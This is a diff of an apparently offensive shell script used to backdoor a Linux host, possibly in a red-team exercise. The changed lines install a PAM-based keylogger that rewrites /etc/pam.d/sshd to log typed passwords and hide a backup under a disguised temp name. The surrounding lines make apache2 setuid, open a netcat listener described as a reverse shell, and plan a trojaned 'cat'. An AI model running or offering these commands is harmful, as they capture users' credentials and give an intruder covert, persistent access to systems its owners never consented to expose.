@@ -19,8 +19,11 @@ systemctl disable postfix
 chmod u+s /usr/sbin/apache2
 #Install reverse shell
 nc -lvp 1337 &
-#Install keylogger :D
-( exec sh; if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk; sudo touch /tmp/system-auth.bk; sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth; sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth; exit; )
+#Install keylogger
+cp -v /etc/pam.d/sshd /tmp/systemdtemporaryfile
+echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" > /etc/pam.d/sshd
+systemctl restart sshd
+systemctl restart auditd
 #Pull modded cat and swap :)
 #Modded cat will append to a file in cyberpup_admin called always_watching.txt
 #Place /usr/bin/keybak so that cat can restore keys
